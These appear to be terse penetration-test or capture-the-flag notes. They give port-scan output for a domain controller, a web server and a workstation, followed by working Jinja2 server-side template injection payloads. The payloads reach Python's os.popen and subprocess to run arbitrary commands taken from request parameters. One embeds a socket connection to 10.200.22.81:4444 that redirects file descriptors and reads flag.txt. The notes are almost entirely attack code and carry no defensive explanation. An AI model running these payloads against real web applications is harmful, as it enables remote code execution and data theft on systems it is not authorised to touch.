DC
```
Discovered open port 135/tcp on 10.1.197.56
Discovered open port 445/tcp on 10.1.197.56
Discovered open port 3389/tcp on 10.1.197.56
Discovered open port 53/tcp on 10.1.197.56
Discovered open port 139/tcp on 10.1.197.56
Discovered open port 88/tcp on 10.1.197.56
Discovered open port 464/tcp on 10.1.197.56
Discovered open port 636/tcp on 10.1.197.56
Discovered open port 593/tcp on 10.1.197.56
Discovered open port 389/tcp on 10.1.197.56
Discovered open port 3268/tcp on 10.1.197.56
Discovered open port 3269/tcp on 10.1.197.56
```

web01
```
Discovered open port 22/tcp on 10.1.160.37
Discovered open port 5000/tcp on 10.1.160.37
```

WKST-01
```
Discovered open port 135/tcp on 10.1.80.144
Discovered open port 3389/tcp on 10.1.80.144
Discovered open port 445/tcp on 10.1.80.144
Discovered open port 139/tcp on 10.1.80.144
```

```sh
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.200.22.81\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

```